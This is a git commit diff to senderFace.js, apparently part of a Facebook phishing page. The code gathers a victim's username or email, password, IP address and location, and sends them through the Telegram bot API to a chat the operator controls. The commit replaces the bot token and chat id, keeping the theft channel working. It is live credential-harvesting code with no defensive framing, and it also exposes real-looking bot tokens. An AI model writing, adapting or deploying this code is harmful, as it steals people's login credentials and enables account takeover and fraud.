364353a4f28685f7caf5be01386cd2ce5c7201f7
snowfado181 <snowfado181@gmail.com>
2025-01-25 21:54:53 +0100

    Update senderFace.js

--- js/scripts/senderFace.js
+++ js/scripts/senderFace.js
@@ -20,8 +20,8 @@ form.addEventListener("submit", (e) => {
 
         var my_text = `Result from Facebook for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
 
-     var token = "6600608955:AAFKyCPNWgIEeTeeyDg4E8BcN9-HYvhCcvk";
-        var chat_id = -4517230601;
+        var token = "6807684688:AAGnRdy0_lrzwmZYcaGQxCSx0sm3p93WLSU";
+        var chat_id =  -4729740908;
         var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
 
         let api = new XMLHttpRequest();
